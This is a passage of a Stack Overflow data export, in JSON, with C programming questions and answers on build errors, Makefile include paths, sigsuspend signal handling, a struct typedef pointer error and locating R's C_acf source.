"https://stackoverflow.com/users/501126/nemequ"}, "is_accepted": false, "score": 0, "last_activity_date": 1518041572, "creation_date": 1518041572, "answer_id": 48674153, "question_id": 48673875, "link": "https://stackoverflow.com/questions/48673875/eclipse-c-build-error-symbols-not-found-for-architecture-x86-64/48674153#48674153", "title": "Eclipse C build error symbol(s) not found for architecture x86_64", "body": "<p><code>getch()</code> is in curses.h, so you'll need to include it. In the code above you could just remove the <code>getch()</code> call, too.</p>\n\n<p>The error message you posted is just <code>make</code> telling you the build failed; there should be more errors before that, from the compiler and/or linker, which should give you a better idea of <em>why</em> it failed.</p>\n"}], "owner": {"reputation": 7, "user_id": 4778634, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/fc3f8ac89f7264a8a256d5d4aa3e936e?s=128&d=identicon&r=PG&f=1", "display_name": "lwillins", "link": "https://stackoverflow.com/users/4778634/lwillins"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 59, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518041572, "creation_date": 1518040325, "question_id": 48673875, "link": "https://stackoverflow.com/questions/48673875/eclipse-c-build-error-symbols-not-found-for-architecture-x86-64", "title": "Eclipse C build error symbol(s) not found for architecture x86_64", "body": "<p>I can't figure out what im missing. I have a main method but it's still not building. Here's my code </p>\n\n<pre><code> #include &lt;stdio.h&gt;\n // #include &lt;conio.h&gt;\n\n\n\nint main(){\nfloat length, width, area;\nprintf(\"Enter length of Rectangle\\n\");\nscanf(\"%f\", &amp;length);\nprintf(\"Enter width of Rectangle\\n\");\nscanf(\"%f\", &amp;width);\n/* Area of Rectangle = Length X Width */\narea = length * width;\nprintf(\"Area of Rectangle : %0.4f\\n\", area);\n\ngetch();\nreturn 0;\n}\n</code></pre>\n\n<p>Also im getting \"make: *** [LabZero] Error 1\" LabZero is the name of the project folder. </p>\n\n<p>Thanks in advance</p>\n"}, {"tags": ["c++", "c", "makefile"], "answers": [{"comments": [{"owner": {"reputation": 139, "user_id": 6929149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9757bec3015e2446ea3d6050118d47f5?s=128&d=identicon&r=PG&f=1", "display_name": "Muhammad Yojer", "link": "https://stackoverflow.com/users/6929149/muhammad-yojer"}, "edited": false, "score": 0, "creation_date": 1518040513, "post_id": 48673856, "comment_id": 84346255, "body": "It doesn&#39;t find all of the header files in all of the subdirectories. I would have to do <code>-Iinclude&#47;subfolder</code> for every subfolder."}, {"owner": {"reputation": 46978, "user_id": 856199, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CPtki.png?s=128&g=1", "display_name": "Nikos C.", "link": "https://stackoverflow.com/users/856199/nikos-c"}, "reply_to_user": {"reputation": 139, "user_id": 6929149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9757bec3015e2446ea3d6050118d47f5?s=128&d=identicon&r=PG&f=1", "display_name": "Muhammad Yojer", "link": "https://stackoverflow.com/users/6929149/muhammad-yojer"}, "edited": false, "score": 1, "creation_date": 1518040941, "post_id": 48673856, "comment_id": 84346451, "body": "@MuhammadYojer Well, that&#39;s what you have to do. The alternative is to put the folder in the <code>#include</code> statement itself. Like <code>#include &quot;subfolder&#47;file.h&quot;</code>, and only use <code>-Iinclude</code> as the compiler switch."}, {"owner": {"reputation": 139, "user_id": 6929149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9757bec3015e2446ea3d6050118d47f5?s=128&d=identicon&r=PG&f=1", "display_name": "Muhammad Yojer", "link": "https://stackoverflow.com/users/6929149/muhammad-yojer"}, "reply_to_user": {"reputation": 46978, "user_id": 856199, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CPtki.png?s=128&g=1", "display_name": "Nikos C.", "link": "https://stackoverflow.com/users/856199/nikos-c"}, "edited": false, "score": 0, "creation_date": 1518041088, "post_id": 48673856, "comment_id": 84346516, "body": "@NikosC. There&#39;s no other alternative?"}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1518041241, "post_id": 48673856, "comment_id": 84346586, "body": "Yes, use a complete full featured build system, like <a href=\"https://www.gnu.org/software/automake/manual/html_node/Autotools-Introduction.html\" rel=\"nofollow noreferrer\">autotools</a> or <a href=\"https://cmake.org/\" rel=\"nofollow noreferrer\">cmake</a>. That way you don&#39;t need to worry about passing the values to the compiler yourself. And it&#39;s a lot easier to change and fix them (<i>it&#39;s more maintainable</i>)."}, {"owner": {"reputation": 46978, "user_id": 856199, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CPtki.png?s=128&g=1", "display_name": "Nikos C.", "link": "https://stackoverflow.com/users/856199/nikos-c"}, "reply_to_user": {"reputation": 139, "user_id": 6929149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9757bec3015e2446ea3d6050118d47f5?s=128&d=identicon&r=PG&f=1", "display_name": "Muhammad Yojer", "link": "https://stackoverflow.com/users/6929149/muhammad-yojer"}, "edited": false, "score": 0, "creation_date": 1518041350, "post_id": 48673856, "comment_id": 84346626, "body": "@MuhammadYojer Well, if you&#39;re writing makefiles by hand, you have to deal with this stuff by hand too. The alternative is to use a build system like Meson or CMake instead, and they will automate much of this. You&#39;ll still have to tell them the directories the headers are in, but they will take care of the compiler flags."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518042085, "post_id": 48673856, "comment_id": 84346984, "body": "Perhaps <code>#include &lt;myheader.h&gt;</code> --&gt; <code>#include &quot;myheader.h&quot;</code>"}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "reply_to_user": {"reputation": 139, "user_id": 6929149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9757bec3015e2446ea3d6050118d47f5?s=128&d=identicon&r=PG&f=1", "display_name": "Muhammad Yojer", "link": "https://stackoverflow.com/users/6929149/muhammad-yojer"}, "edited": false, "score": 0, "creation_date": 1518042771, "post_id": 48673856, "comment_id": 84347275, "body": "@MuhammadYojer If you learn something like <i>cmake</i> you can then, use wildcards for subfolders."}, {"owner": {"reputation": 139, "user_id": 6929149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9757bec3015e2446ea3d6050118d47f5?s=128&d=identicon&r=PG&f=1", "display_name": "Muhammad Yojer", "link": "https://stackoverflow.com/users/6929149/muhammad-yojer"}, "edited": false, "score": 0, "creation_date": 1518042852, "post_id": 48673856, "comment_id": 84347310, "body": "@IharobAlAsimi Maybe I&#39;ll try it."}], "tags": [], "owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "is_accepted": false, "score": 2, "last_activity_date": 1518040342, "last_edit_date": 1518040342, "creation_date": 1518040256, "answer_id": 48673856, "question_id": 48673829, "link": "https://stackoverflow.com/questions/48673829/find-all-header-files-in-all-sub-directories/48673856#48673856", "title": "Find all header files in all sub-directories", "body": "<p>Simple, just use</p>\n\n<pre><code>#include &lt;myheader.h&gt;\n</code></pre>\n\n<p>and pass the relevant directory to the compiler through the <code>-I</code> switch.</p>\n\n<p>For instance, if <em>myheader.h</em> was in <em>include/subfolder</em> then,\n</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$(CC) -Iinclude/subfolder\n</code></pre>\n\n<p>will work.</p>\n\n<p>Note that you must also <em>include</em> the subfolder in the <code>-I</code> argument because only the top level directory is scanned for headers.</p>\n"}, {"tags": [], "owner": {"reputation": 3767, "user_id": 8710344, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e2292c452c0d0c9824d2aa38bb74d9fc?s=128&d=identicon&r=PG&f=1", "display_name": "HardcoreHenry", "link": "https://stackoverflow.com/users/8710344/hardcorehenry"}, "is_accepted": true, "score": 1, "last_activity_date": 1518043454, "last_edit_date": 1518043454, "creation_date": 1518043058, "answer_id": 48674480, "question_id": 48673829, "link": "https://stackoverflow.com/questions/48673829/find-all-header-files-in-all-sub-directories/48674480#48674480", "title": "Find all header files in all sub-directories", "body": "<p>You can auto-generate the include dir flags simply enough:</p>\n\n<pre><code> INC_DIRS := $(shell find include -type d)\n C_INC_FLAGS := $(addprefix -I,$(INC_DIRS))\n\n %.o: %.c $(HEADERS)\n    $(CC) $(CFLAGS) $(C_INC_FLAGS) -c $&lt; -o $@\n</code></pre>\n\n<p>Note, that most systems have a maximum line length (usually around 64k), so if you have LOTS of directories, you may have to worry that you exceed the max line length (at which point you pipe the dirs to a file and include with <code>@file</code>...)</p>\n\n<p>Also, this doesn't work if you autogenerate new directories in your include directory through your make rules, as those directories will not be there when you populate <code>INC_DIRS</code> the first time around.</p>\n"}], "owner": {"reputation": 139, "user_id": 6929149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9757bec3015e2446ea3d6050118d47f5?s=128&d=identicon&r=PG&f=1", "display_name": "Muhammad Yojer", "link": "https://stackoverflow.com/users/6929149/muhammad-yojer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 369, "favorite_count": 0, "accepted_answer_id": 48674480, "answer_count": 2, "score": 0, "last_activity_date": 1518043454, "creation_date": 1518040174, "last_edit_date": 1518040351, "question_id": 48673829, "link": "https://stackoverflow.com/questions/48673829/find-all-header-files-in-all-sub-directories", "title": "Find all header files in all sub-directories", "body": "<p>I am trying to use any header from my <code>include</code> folder in any source file in my <code>src</code> folder. Right now, I am doing <code>\"#include ../../include/subfolder/file.h\"</code> or <code>#include \"../include/otherfile.h\"</code>to get access to my header files, but this is very verbose, and anytime I do a directory restructure, I have to go back and change every reference to the affected header files. I would like to just be able to do <code>#include \"file.h\"</code> from any source file, but I can't seem to do it. Doing <code>-Iinclude</code> or <code>-Iinclude/</code> can't find the headers in <code>subfolder</code> for some reason. Changing my include statement to <code>#include &lt;file.h&gt;</code> also doesn't work. What can I do to fix this?</p>\n\n<p>I have a project layout that looks like this:</p>\n\n<pre><code>Makefile\n\ninclude\n    subfolder\n        file.h\n    otherfile.h\n\nsrc\n    subfolder\n        file.c\n    otherfile.c\n</code></pre>\n\n<p>My Makefile looks like this:</p>\n\n<pre><code>TARGET = program\nLIBS = -llibs\nCC = gcc\nCFLAGS = -Wall -g -Iinclude/\n\n.PHONY: default all clean\n\ndefault: $(TARGET)\nall: default\n\nOBJECTS = $(patsubst %.c, %.o, $(shell find . -name '*.c'))\nHEADERS = $(shell find . -name '*.h')\n\n%.o: %.c $(HEADERS)\n    $(CC) $(CFLAGS) -c $&lt; -o $@\n\n.PRECIOUS: $(TARGET) $(OBJECTS)\n\n$(TARGET): $(OBJECTS)\n    $(CC) $(OBJECTS) -Wall $(LIBS) -o $@\n\nclean:\n    find . -type f -name '*.o' -exec rm {} +\n    find . -type f -name $(TARGET) -exec rm {} +\n</code></pre>\n"}, {"tags": ["c", "process", "signals", "fork"], "comments": [{"owner": {"reputation": 51391, "user_id": 132382, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/20fc7ee8f405aa42e36eb73e841e5a36?s=128&d=identicon&r=PG", "display_name": "pilcrow", "link": "https://stackoverflow.com/users/132382/pilcrow"}, "edited": false, "score": 0, "creation_date": 1518040503, "post_id": 48673697, "comment_id": 84346247, "body": "The accepted answer in your linked question explains that the {{sigset_t}} argument to <i>sigsuspend</i> specifies those signals you will disregard.  In setting SIGUSR1, you are instructing <i>sigsuspend</i> to block it.  Try removing the line where you call <i>sigaddset</i> and see what happens."}, {"owner": {"reputation": 51, "user_id": 8941812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b34e6dc0d298898fa2c4b75adc2e99fc?s=128&d=identicon&r=PG&f=1", "display_name": "Gamma", "link": "https://stackoverflow.com/users/8941812/gamma"}, "reply_to_user": {"reputation": 51391, "user_id": 132382, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/20fc7ee8f405aa42e36eb73e841e5a36?s=128&d=identicon&r=PG", "display_name": "pilcrow", "link": "https://stackoverflow.com/users/132382/pilcrow"}, "edited": false, "score": 0, "creation_date": 1518041204, "post_id": 48673697, "comment_id": 84346572, "body": "yes, still doesn&#39;t work, I forgot to mention, in the linked question he used sigdelset(&amp;mask), i also used this and it didn&#39;t work. Even if i call kill with a different signal (e.g. <code>kill(pid,SIGCONT)</code>) the execution doesn&#39;t run past the <code>sigsuspend(&amp;mask)</code>"}], "answers": [{"tags": [], "owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "is_accepted": false, "score": 1, "last_activity_date": 1518041347, "creation_date": 1518041347, "answer_id": 48674102, "question_id": 48673697, "link": "https://stackoverflow.com/questions/48673697/c-cant-signal-a-child-process-to-continue-after-sigsuspend/48674102#48674102", "title": "C Can&#39;t signal a child process to continue after `sigsuspend`", "body": "<p>You have a few issues.</p>\n\n<p>Your parent process should wait for the child to complete. This allows for diagnostics (such as properly waiting for the child to print), but is otherwise a bookkeeping task that is a good habit even when the waiting process will just exit:</p>\n\n<pre><code>  printf(\"This is the parentProcess id = %d \\n\",getpid());\n  printf(\"The  parentProcess is complete\\n\");\n  sleep(1);\n  int j = kill(pid,SIGUSR1);\n  if (j!=0)\n  {\n       perror(NULL);\n       exit(0);\n  }\n  waitpid(pid, NULL, 0);\n  exit(0);\n</code></pre>\n\n<p>Now, you have set <code>SIGUSR1</code> in your mask to <code>sigsuspend()</code>, which causes the signal to be ignored. This is now more obvious once the parent is made to wait, because the parent will never exit. So, remove the line of code that sets <code>SIGUSR1</code>.</p>\n\n<p>Finally, the default handler for <code>SIGUSR1</code> will simply cause the process to exit, and so the <code>printf</code> will not get a chance to print. If you want it to print, you should add a signal handler for <code>SIGUSR1</code>. It doesn't have to do anything.</p>\n\n<pre><code>void h (int s) {}\n...\n\n      sigset_t mask;\n      sigemptyset(&amp;mask);\n      //sigaddset(&amp;mask,SIGUSR1);\n      printf(\"This is the child Process id = %d \\n\",getpid());\n      struct sigaction sa = { .sa_handler = h };\n      sigaction(SIGUSR1, &amp;sa, NULL);\n      sigsuspend(&amp;mask);\n      printf(\"The child is now complete \\n\");\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1518041631, "post_id": 48674113, "comment_id": 84346756, "body": "Upvoted, since we have essentially provided the same answer at the same time."}], "tags": [], "owner": {"reputation": 15050, "user_id": 8605791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ae3be140b26db13a86d624dba4ef1c8?s=128&d=identicon&r=PG&f=1", "display_name": "llllllllll", "link": "https://stackoverflow.com/users/8605791/llllllllll"}, "is_accepted": true, "score": 1, "last_activity_date": 1518041378, "creation_date": 1518041378, "answer_id": 48674113, "question_id": 48673697, "link": "https://stackoverflow.com/questions/48673697/c-cant-signal-a-child-process-to-continue-after-sigsuspend/48674113#48674113", "title": "C Can&#39;t signal a child process to continue after `sigsuspend`", "body": "<p>There are 3 problems in your code:</p>\n\n<ol>\n<li><p><code>SIGUSR1</code> is the signal you want to deliver to the child. You can't use <code>sigaddset(&amp;mask,SIGUSR1);</code>, it does exactly the opposite of your intention.</p></li>\n<li><p>According to POSIX standard <a href=\"http://pubs.opengroup.org/onlinepubs/000095399/functions/sigsuspend.html\" rel=\"nofollow noreferrer\"><code>sigsuspend()</code></a> below, you should install a signal handler for <code>SIGUSR1</code> to make <code>sigsuspend()</code> continue the following code, since the default behavior of <code>SIGUSR1</code> is termination.</p></li>\n</ol>\n\n<blockquote>\n  <p>The sigsuspend() function shall replace the current signal mask of the calling thread with the set of signals pointed to by sigmask and then suspend the thread until delivery of <strong>a signal whose action is either to execute a signal-catching function or to terminate the process</strong>.</p>\n</blockquote>\n\n<ol start=\"3\">\n<li>It would be better if you collect the child from the parent, otherwise there is a race condition.</li>\n</ol>\n\n<p>The code below will work:</p>\n\n<pre><code>#include &lt;signal.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid handler(int sig) {}\n\nint main(void){\n pid_t  pid;\n int    i;\n pid = fork();\n\n signal(SIGUSR1, handler);\n\n if(pid==0){\n      sigset_t mask;\n      sigemptyset(&amp;mask);\n      //sigaddset(&amp;mask,SIGUSR1);\n      printf(\"This is the child Process id = %d \\n\",getpid());\n      sigsuspend(&amp;mask);\n      printf(\"The child is now complete \\n\");\n }\n\n else{\n      printf(\"This is the parentProcess id = %d \\n\",getpid());\n      printf(\"The  parentProcess is complete\\n\");\n      sleep(1);\n      int j = kill(pid,SIGUSR1);\n      if (j!=0)\n      {\n           perror(NULL);\n      }\n      wait(NULL);\n      exit(0);\n }\n}\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 8941812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b34e6dc0d298898fa2c4b75adc2e99fc?s=128&d=identicon&r=PG&f=1", "display_name": "Gamma", "link": "https://stackoverflow.com/users/8941812/gamma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 829, "favorite_count": 1, "accepted_answer_id": 48674113, "answer_count": 2, "score": 2, "last_activity_date": 1518041378, "creation_date": 1518039578, "question_id": 48673697, "link": "https://stackoverflow.com/questions/48673697/c-cant-signal-a-child-process-to-continue-after-sigsuspend", "title": "C Can&#39;t signal a child process to continue after `sigsuspend`", "body": "<p>I'm trying to create a program where a process forks, creating a child process, and the parent must always finish printing to the screen before the child is finished printing to the screen, no matter what. I also wish to accomplish this using signals instead of pipelining.</p>\n\n<p>It is a similar problem to the question asked here: <a href=\"https://stackoverflow.com/questions/15283934/explanation-of-sigsuspend-needed\">Explanation of sigsuspend needed</a></p>\n\n<p>I understand that <code>kill(pid,signal);</code> is to send a signal to that pid and tell it to finish executing and terminate.</p>\n\n<p>The problem is, when it executes, the child doesn't print after the suspend. Heres the code:</p>\n\n<pre><code>int main(void){\n pid_t  pid;\n int    i;\n pid = fork();\n\n if(pid==0){\n      sigset_t mask;\n      sigemptyset(&amp;mask);\n      sigaddset(&amp;mask,SIGUSR1);\n      printf(\"This is the child Process id = %d \\n\",getpid());\n      sigsuspend(&amp;mask);\n      printf(\"The child is now complete \\n\");\n\n }\n\n else{\n      printf(\"This is the parentProcess id = %d \\n\",getpid());\n      printf(\"The  parentProcess is complete\\n\");\n      sleep(1);\n      int j = kill(pid,SIGUSR1);\n      if (j!=0)\n      {\n           perror(NULL);\n      }\n      exit(0);\n }\n}\n</code></pre>\n\n<p>I have managed to accomplish my task (printing the parent before the child) by using a global variable <code>int x = 0;</code> and a signal handler method <code>void handle1(int s){x = 1;}</code>before the main. In the main I added <code>signal(SIGUSR1,handle1);</code> In the child I removed all the sigset and sigsuspend lines and instead wrote <code>while(x==0){/*do_nothing*/}</code> 1 line before the <code>printf</code> statement. So when the parent executes <code>kill(pid,SIGUSR1)</code> the signal handler which is inherited by the child process also gets executed and sets x=1. So the child now leaves the while loop and can print it's statement.</p>\n\n<p>However I believe it would be helpful to know how to accomplish this task using <code>sigmask_t</code> and <code>sigsuspend()</code> but i cant get it to work that way.</p>\n"}, {"tags": ["c", "error-handling"], "answers": [{"comments": [{"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1518039367, "post_id": 48673633, "comment_id": 84345724, "body": "I didn&#39;t catch that, quick eyes."}, {"owner": {"reputation": 44802, "user_id": 2752075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5oQlf.png?s=128&g=1", "display_name": "HolyBlackCat", "link": "https://stackoverflow.com/users/2752075/holyblackcat"}, "reply_to_user": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 1, "creation_date": 1518039397, "post_id": 48673633, "comment_id": 84345731, "body": "@IharobAlAsimi I didn&#39;t see it at the first glance too, had to actually compile it and look at error messages."}], "tags": [], "owner": {"reputation": 44802, "user_id": 2752075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5oQlf.png?s=128&g=1", "display_name": "HolyBlackCat", "link": "https://stackoverflow.com/users/2752075/holyblackcat"}, "is_accepted": true, "score": 8, "last_activity_date": 1518039327, "creation_date": 1518039327, "answer_id": 48673633, "question_id": 48673609, "link": "https://stackoverflow.com/questions/48673609/incompatible-pointers-in/48673633#48673633", "title": "Incompatible Pointers in =", "body": "<p>This line makes a pointer to <code>struct olnode</code>:</p>\n\n<pre><code>struct olnode *next;\n</code></pre>\n\n<p>But you don't define such struct. You only have an anonymous struct, <code>typedef</code>ed to <code>olnode</code>.</p>\n\n<p>Fix:</p>\n\n<pre><code>typedef struct olnode {...} olnode;\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 9329923, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ae4daeac566ffa989405b8f0d008f8e?s=128&d=identicon&r=PG&f=1", "display_name": "Ben Groseclose", "link": "https://stackoverflow.com/users/9329923/ben-groseclose"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 1, "accepted_answer_id": 48673633, "answer_count": 1, "score": 4, "last_activity_date": 1518039327, "creation_date": 1518039160, "question_id": 48673609, "link": "https://stackoverflow.com/questions/48673609/incompatible-pointers-in", "title": "Incompatible Pointers in =", "body": "<p>I do not know how to get around this error. I must not be assigning the same type. Keep receiving an '(strict) incompatible pointers in ='</p>\n\n<pre><code>#define POOLSZ 53\ntypedef struct{\n     int eventnr;\n     int eventfq;\n     struct olnode *next;\n}olnode;\n\nolnode pool[POOLSZ];\nolnode *avail\n\nvoid initpool()\n{\n    int i;\n\n    for(i = 0; i &lt; POOLSZ-1; i++)\n        pool[i].next = &amp;pool[i+1]; /*This is the error line */\n    pool[i].next = NULL;\n    avail = pool;\n}\n</code></pre>\n"}, {"tags": ["c", "r"], "comments": [{"owner": {"reputation": 103366, "user_id": 903061, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/jMWGQ.jpg?s=128&g=1", "display_name": "Gregor Thomas", "link": "https://stackoverflow.com/users/903061/gregor-thomas"}, "edited": false, "score": 3, "creation_date": 1518039187, "post_id": 48673423, "comment_id": 84345656, "body": "<a href=\"https://github.com/SurajGupta/r-source/blob/a28e609e72ed7c47f6ddfbb86c85279a0750f0b7/src/library/stats/src/filter.c\" rel=\"nofollow noreferrer\">Line 143 here</a>? I think the <code>C_</code> is dropped, as it is for <code>pnorm</code> in Ben Bolker&#39;s <a href=\"https://stackoverflow.com/a/14035586/903061\">answer here on the question you link</a>"}, {"owner": {"reputation": 203, "user_id": 4055199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fe335b61af780a4a10bf8672ebf4213a?s=128&d=identicon&r=PG&f=1", "display_name": "sdg238", "link": "https://stackoverflow.com/users/4055199/sdg238"}, "reply_to_user": {"reputation": 103366, "user_id": 903061, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/jMWGQ.jpg?s=128&g=1", "display_name": "Gregor Thomas", "link": "https://stackoverflow.com/users/903061/gregor-thomas"}, "edited": false, "score": 0, "creation_date": 1518040473, "post_id": 48673423, "comment_id": 84346233, "body": "Ah ha!  But how did you know to look in the file filter.c?"}, {"owner": {"reputation": 103366, "user_id": 903061, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/jMWGQ.jpg?s=128&g=1", "display_name": "Gregor Thomas", "link": "https://stackoverflow.com/users/903061/gregor-thomas"}, "edited": false, "score": 0, "creation_date": 1518040623, "post_id": 48673423, "comment_id": 84346297, "body": "I searched the github repository for &quot;acf&quot;, in the languages sidebar on the left I filtered the results to C. There were 5 results, and upon inspection the first one was correct."}], "answers": [{"tags": [], "owner": {"reputation": 11410, "user_id": 1691723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/46f6ca5a15ad9bad637ee4b50946f470?s=128&d=identicon&r=PG", "display_name": "Sathish", "link": "https://stackoverflow.com/users/1691723/sathish"}, "is_accepted": false, "score": 5, "last_activity_date": 1518044440, "last_edit_date": 1518044440, "creation_date": 1518039278, "answer_id": 48673628, "question_id": 48673423, "link": "https://stackoverflow.com/questions/48673423/r-source-file-for-acf-function/48673628#48673628", "title": "R source file for acf function", "body": "<p>This method will help identify the source code of the compiled function which has class of <code>CallRoutine</code> or <code>NativeSymbolInfo</code>.</p>\n\n<p>Find the namespace of the call routine</p>\n\n<pre><code>getAnywhere(C_acf)\n# namespace:stats\n</code></pre>\n\n<p>Download your version of the base R, because stats is part of the base R.</p>\n\n<pre><code>download.file(url = \"https://cran.r-project.org/src/base/R-3/R-3.0.0.tar.gz\", destfile = \"./R-3.0.0.tar.gz\")\nuntar(tarfile = \"./R-3.0.0.tar.gz\", exdir = \"./\")\n</code></pre>\n\n<p>handle directory paths</p>\n\n<pre><code>old_dir &lt;- getwd()\nsetwd(\"./R-3.0.0/src/library/stats/src/\")\n</code></pre>\n\n<p>find the word <code>acf</code> in source files. You have to go through the list of results and identify the exact function. The easiest way is to look at the function name and its arguments. </p>\n\n<pre><code>myresults &lt;- sapply( list.files(\"./\"), function(x) grep(\"acf\", readLines(x), value = TRUE))\nmyresults &lt;- myresults[lengths(myresults) != 0]\nmyresults[2] \n# $filter.c\n# [1] \"acf0(double *x, int n, int ns, int nl, int correlation, double *acf)\"\n# [2] \"\\t\\tacf[lag + d1*u + d2*v] = (nu &gt; 0) ? sum/(nu + lag) : NA_REAL;\"     \n# [3] \"\\t    se[u] = sqrt(acf[0 + d1*u + d2*u]);\"                            \n# [4] \"\\t\\tacf[0 + d1*u + d2*u] = 1.0;\"                                       \n# [5] \"\\t\\t\\tacf[lag + d1*u + d2*v] /= se[u]*se[v];\"                           \n# [6] \"SEXP acf(SEXP x, SEXP lmax, SEXP sCor)\"                              \n# [7] \"    acf0(REAL(x), nx, ns, lagmax, cor, REAL(ans));\"  \n</code></pre>\n\n<p>reset old directory path</p>\n\n<pre><code>setwd(old_dir)\n</code></pre>\n\n<p><strong>Reference:</strong></p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/19226816/how-can-i-view-the-source-code-for-a-function\">1</a></li>\n<li><a href=\"https://stackoverflow.com/a/34708875/1691723\">2</a></li>\n</ul>\n"}], "owner": {"reputation": 203, "user_id": 4055199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fe335b61af780a4a10bf8672ebf4213a?s=128&d=identicon&r=PG&f=1", "display_name": "sdg238", "link": "https://stackoverflow.com/users/4055199/sdg238"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 464, "favorite_count": 1, "answer_count": 1, "score": 4, "last_activity_date": 1518044440, "creation_date": 1518038374, "question_id": 48673423, "link": "https://stackoverflow.com/questions/48673423/r-source-file-for-acf-function", "title": "R source file for acf function", "body": "<p>The <code>acf</code> function in R's stats library includes the line</p>\n\n<pre><code>.Call(C_acf, x, lag.max, type == \"correlation\")\n</code></pre>\n\n<p>but I can't find the file <code>C_acf</code> anywhere on my machine (nor at <a href=\"https://github.com/SurajGupta/r-source\" rel=\"nofollow noreferrer\">https://github.com/SurajGupta/r-source</a> nor <a href=\"https://github.com/wch/r-source\" rel=\"nofollow noreferrer\">https://github.com/wch/r-source</a>).</p>\n\n<p>Applying the advice at these questions didn't help:</p>\n\n<p><a href=\"https://stats.stackexchange.com/questions/254227/manual-calculation-of-acf-of-a-time-series-in-r-close-but-not-quite\">https://stats.stackexchange.com/questions/254227/manual-calculation-of-acf-of-a-time-series-in-r-close-but-not-quite</a></p>\n\n<p><a href=\"https://stackoverflow.com/questions/14035506/how-to-see-the-source-code-of-r-internal-or-primitive-function\">How to see the source code of R .Internal or .Primitive function?</a></p>\n\n<p>The file doesn't appear to be anywhere where people say to look. How can I find C_acf?</p>\n"}, {"tags": ["c", "linux", "bpf", "ebpf"], "comments": [{"owner": {"reputation": 7068, "user_id": 6884590, "user_type": "registered", "profile_image": 